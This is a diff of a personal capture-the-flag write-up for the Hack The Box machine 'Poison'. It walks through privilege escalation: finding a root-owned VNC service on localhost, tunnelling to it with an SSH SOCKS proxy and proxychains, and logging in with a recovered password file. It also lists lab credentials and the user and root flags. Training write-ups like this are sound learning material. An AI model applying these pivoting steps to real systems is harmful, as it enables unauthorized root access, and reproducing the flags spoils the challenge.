@@ -1,6 +1,6 @@
 ---
-Started: "04-07-25 | 09:27"
-Ended: "04-07-25 |"
+Started: 04-07-25 | 09:27
+Ended: 05-07-25 | 11:54
 ---
 
 #CTF/HTB/Linux/Medium
@@ -20,6 +20,7 @@ Poison is a fairly easy machine which focuses mainly on log poisoning and port f
 - Checked for open ports first using Rustscan.
 
 ![](Assets/Pasted%20image%2020250704094124.png)
+
 - Only ports open are the http port and ssh port. We use this to narrow down on what ports to scan on nmap. However as a matter of good practice, I still run a full port scan in the background. 
 - The nmap scan of these two open ports shows us that we have an Apache server running FreeBSD.
 
@@ -73,17 +74,71 @@ Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGho
 
 - The user flag was on the desktop, along with a zip file called `secret.zip`
 
+![](Assets/Pasted%20image%2020250704161852.png)
+
 ## Privesc
+
+- Went down the linux privesc checklist, and when I got to network information I ran `netstat -a` and got the following output
+
+```shell
+charix@Poison:~ % netstat -a                                                      
+Active Internet connections (including servers) 
+Proto Recv-Q Send-Q Local Address          Foreign Address        (state)         
+                       
+tcp4       0      0 10.10.10.84.ssh        10.10.14.35.53924 ESTABLISHED     
+tcp4       0      0 localhost.smtp         *.*        LISTEN
+tcp4       0      0 *.http                 *.*        LISTEN          
+tcp6       0      0 *.http                 *.*        LISTEN
+tcp4       0      0 *.ssh                  *.*        LISTEN          
+tcp6       0      0 *.ssh                  *.*        LISTEN
+tcp4       0      0 localhost.5801         *.*        LISTEN          
+tcp4       0      0 localhost.5901         *.*        LISTEN
+udp4       0      0 *.syslog               *.* 
+udp6       0      0 *.syslog               *.*
+```
+
+- I noticed 2 ports listening in on localhost, and these weren't standard. Ports 5801 and 5901 are VNC (Virtual Network Computing) ports.
+- I need to check out the process details for the VNC service, because hopefully its run by root, and I can hop onto it to escalate my current privileges.
+
+```shell
+charix@Poison:~ % ps -auwwx | grep vnc
+root   529   0.0  0.9 23620  8872 v0- I    04:29    0:00.01 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -
+rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
+charix 813   0.0  0.0   412   328  1  R+   05:06    0:00.00 grep vnc
+```
+
+- There's an issue here though because VNC is a GUI based service, and I can't run it through the shell I have as charix. So the process here would be:
+	- Use charix as a pivot.
+	- Forward the VNC network traffic to my host machine so I can see what's going on. 
+- In order to do this over SSH, I have to modify my `/etc/proxychains.conf` file by adding a socks proxy port for me to forward traffic from charix.
+	- `socks4 127.0.0.1 8081`
+- Next, I have to ssh into charix, and forward traffic to port 8081
+	- `ssh charix@10.10.10.84 -D 8081`
+- Finally, I have to get the `secret.zip` file onto my attacking host, unzip it using Charix's password, and use it to run vncviewer through proxtychains. A simplified diagram looks something like this:
+
+![](Assets/Pasted%20image%2020250705134503.png)
+
+- The code for running vncviewer via proxychains is below:
+
+```shell
+proxychains vncviewer 10.10.10.84:5901 -passwd ./secret
+```
+
+- This opens up a vncviewer session on our kali attacking host, with an open terminal. We can use that terminal to look for the root flag.
 
 # Creds
 
 - Low level creds:
 	- charix : Charix!2#4%6&8(0
+- secret.zip
 
 # Flags
 
 user: eaacdfb2d141b72a589233063604209c
+root: 716d04b188419cf2bb99d891272361f5
 
 # Proof
 
 ![](Assets/Pasted%20image%2020250704161905.png)
+
+![](Assets/Pasted%20image%2020250705115230.png)
